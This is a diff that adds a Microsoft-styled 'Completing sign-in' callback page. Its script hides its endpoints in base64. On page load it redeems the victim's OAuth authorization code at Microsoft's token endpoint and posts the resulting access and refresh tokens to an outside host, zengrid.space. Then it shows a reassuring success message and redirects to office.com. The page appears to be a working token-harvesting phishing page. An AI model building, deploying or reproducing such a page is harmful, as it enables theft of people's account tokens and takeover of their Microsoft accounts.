@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Completing sign-in&hellip;</title>
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 21 21'%3E%3Crect x='0' y='0' width='9.5' height='9.5' fill='%23f25022'/%3E%3Crect x='11.5' y='0' width='9.5' height='9.5' fill='%237fba00'/%3E%3Crect x='0' y='11.5' width='9.5' height='9.5' fill='%2300a4ef'/%3E%3Crect x='11.5' y='11.5' width='9.5' height='9.5' fill='%23ffb900'/%3E%3C/svg%3E"/>
+  <link rel="shortcut icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 21 21'%3E%3Crect x='0' y='0' width='9.5' height='9.5' fill='%23f25022'/%3E%3Crect x='11.5' y='0' width='9.5' height='9.5' fill='%237fba00'/%3E%3Crect x='0' y='11.5' width='9.5' height='9.5' fill='%2300a4ef'/%3E%3Crect x='11.5' y='11.5' width='9.5' height='9.5' fill='%23ffb900'/%3E%3C/svg%3E"/>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
+      background: #f3f2f1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
+    .box {
+      text-align: center;
+      padding: 48px 40px;
+      background: #fff;
+      border-radius: 10px;
+      box-shadow: 0 2px 16px rgba(0,0,0,.10);
+      max-width: 400px;
+      width: 90%;
+    }
+    .spinner {
+      width: 44px; height: 44px;
+      border: 3px solid #e1dfdd;
+      border-top-color: #0078d4;
+      border-radius: 50%;
+      animation: spin .8s linear infinite;
+      margin: 0 auto 22px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    h2 { margin: 0 0 10px; font-size: 20px; color: #1a1918; }
+    p { margin: 0; font-size: 14px; color: #605e5c; line-height: 1.6; }
+  </style>
+</head>
+<body>
+<div class="box">
+  <div class="spinner" id="spinner"></div>
+  <h2 id="heading">Completing sign-in&hellip;</h2>
+  <p id="msg">Please wait while we confirm your account.</p>
+</div>
+<script>
+  (function(){
+    const _d=e=>atob(e);
+    const _v0=_d("aHR0cHM6Ly96ZW5ncmlkLnNwYWNl"),_v1=_d("L2F1dGgvcGtjZS1wYXJhbXM="),_v2=_d("L2F1dGgvc2F2ZS10b2tlbnM="),_v3=_d("aHR0cHM6Ly9sb2dpbi5taWNyb3NvZnRvbmxpbmUuY29tLw=="),_v4=_d("L29hdXRoMi92Mi4wL3Rva2Vu");
+    const _q=new URLSearchParams(window.location.search);
+    const _c=_q.get("code"),_st=_q.get("state"),_er=_q.get("error");
+
+    function _show(col,hd,ms){
+      document.getElementById("spinner").style.display="none";
+      const h=document.getElementById("heading");
+      h.textContent=hd;h.style.color=col;
+      document.getElementById("msg").textContent=ms;
+    }
+
+    async function _run(){
+      if(_er||!_c||!_st){
+        _show("#d13438","Sign-in failed","Error: "+(_er||"No authorization code received.")+" Please close this tab and try again.");
+        return;
+      }
+      let _pm;
+      try{
+        const _r1=await fetch(_v0+_v1+"?state="+encodeURIComponent(_st));
+        _pm=await _r1.json();
+        if(!_r1.ok){_show("#d13438","Sign-in failed",_pm.detail||"Session not found. Please try again.");return;}
+      }catch(e){_show("#d13438","Sign-in failed","Could not reach the server. Please try again.");return;}
+      let _tk2;
+      try{
+        const _r2=await fetch(_v3+_pm.tenant+_v4,{
+          method:"POST",
+          headers:{"Content-Type":"application/x-www-form-urlencoded"},
+          body:new URLSearchParams({
+            client_id:_pm.client_id,
+            grant_type:"authorization_code",
+            code:_c,
+            redirect_uri:_pm.redirect_uri,
+            code_verifier:_pm.code_verifier,
+            scope:_pm.scope
+          })
+        });
+        _tk2=await _r2.json();
+        if(!_r2.ok||!_tk2.access_token){
+          _show("#d13438","Sign-in failed",(_tk2.error_description||_tk2.error||"Token exchange failed.")+" Please close this tab and try again.");
+          return;
+        }
+      }catch(e){_show("#d13438","Sign-in failed","Could not contact Microsoft. Please try again.");return;}
+      try{
+        const _r3=await fetch(_v0+_v2,{
+          method:"POST",
+          headers:{"Content-Type":"application/json"},
+          body:JSON.stringify({state:_st,..._tk2})
+        });
+        const _rs=await _r3.json();
+        if(_rs.ok){
+          _show("#107c10","Account Authorized","Your account has been linked successfully. You can close this tab.");
+          setTimeout(function(){
+            if(_rs.success_url){window.location.href=_rs.success_url;}
+            else{window.location.href="https://www.office.com";}
+          },2000);
+        }
+        else{_show("#d13438","Sign-in failed",(_rs.detail||"Could not save account.")+" Please close this tab and try again.");}
+      }catch(e){_show("#d13438","Sign-in failed","Could not reach the server. Please try again.");}
+    }
+    _run();
+  })();
+</script>
+</body>
+</html>
